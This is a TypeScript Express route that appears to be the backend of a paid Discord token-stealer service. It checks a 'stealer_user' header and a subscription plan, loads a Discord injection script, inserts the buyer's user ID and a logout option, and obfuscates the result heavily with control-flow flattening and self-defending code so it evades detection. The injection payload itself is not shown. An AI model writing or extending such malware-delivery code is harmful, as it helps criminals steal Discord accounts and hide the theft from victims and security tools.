import js_obf from 'javascript-obfuscator';
import { obfuscate } from 'js-confuser';
import { Request, Response } from 'express';
import { PrismaClient } from '@prisma/client';
import { readFileSync, writeFileSync } from 'fs';
import { join } from 'path';

const prisma = new PrismaClient();

export default {
    name: `/api/injections`, method: 'get',

    async execute(req: Request, res: Response) {
      if(!req?.headers?.stealer_user) return res.status(401);
      const user = await prisma.users.findFirst({
        where: {
            id: req?.headers?.stealer_user as string
        }
    });

    if(!user?.plan) return res.status(401);

    const discord_injection = readFileSync(join(__dirname, 'type', 'discord.js'), 'utf-8').replace('USER_ID_HERE', req?.headers?.stealer_user as string)
    .replace('DISCORD_LOGOUT_HERE', req?.headers?.logout_discord as string);

    const first_obfuscation = js_obf.obfuscate(discord_injection,  {
      compact: true,
      controlFlowFlattening: true,
      controlFlowFlatteningThreshold: 1,
      numbersToExpressions: true,
      simplify: true,
      shuffleStringArray: true,
      splitStrings: true,
      stringArrayThreshold: 1,
      selfDefending: true,
     }).getObfuscatedCode();

    res.status(200).json({
      discord: first_obfuscation,
    });
  },
};